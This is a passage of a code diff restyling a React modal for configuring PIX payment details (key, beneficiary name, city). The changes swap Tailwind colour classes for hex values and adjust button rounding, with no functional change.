             <label className="text-gray-400 text-sm">Chave PIX</label>
-            <input type="text" value={form.pixKey} onChange={(e) => setForm({ ...form, pixKey: e.target.value })} className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1" placeholder="Sua chave PIX" />
+            <input type="text" value={form.pixKey} onChange={(e) => setForm({ ...form, pixKey: e.target.value })} className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1" placeholder="Sua chave PIX" />
           </div>
           
           <div>
             <label className="text-gray-400 text-sm">Nome do Beneficiário</label>
-            <input type="text" value={form.beneficiaryName} onChange={(e) => setForm({ ...form, beneficiaryName: e.target.value })} className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1" placeholder="Nome que aparece no PIX" />
+            <input type="text" value={form.beneficiaryName} onChange={(e) => setForm({ ...form, beneficiaryName: e.target.value })} className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1" placeholder="Nome que aparece no PIX" />
           </div>
           
           <div>
             <label className="text-gray-400 text-sm">Cidade</label>
-            <input type="text" value={form.beneficiaryCity} onChange={(e) => setForm({ ...form, beneficiaryCity: e.target.value })} className="w-full bg-slate-700 text-white px-3 py-2 rounded mt-1" placeholder="Cidade" />
+            <input type="text" value={form.beneficiaryCity} onChange={(e) => setForm({ ...form, beneficiaryCity: e.target.value })} className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded mt-1" placeholder="Cidade" />
           </div>
           
           <label className="flex items-center gap-2 cursor-pointer">
@@ -5390,10 +5390,10 @@ const PixConfigModal: React.FC<{
         </div>
         
         <div className="flex gap-3 mt-6">
-          <button onClick={onClose} className="flex-1 py-2 bg-slate-600 hover:bg-slate-500 text-white rounded-lg font-semibold">
+          <button onClick={onClose} className="flex-1 py-2 bg-[#6f6f78] hover:bg-[#8b8b94] text-white rounded-md font-semibold">
             Cancelar
           </button>
-          <button onClick={() => onSave(form)} className="flex-1 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold">
+          <button onClick={() => onSave(form)} className="flex-1 py-2 bg-green-600 hover:bg-green-700 text-white rounded-md font-semibold">
             Salvar
           </button>
         </div>
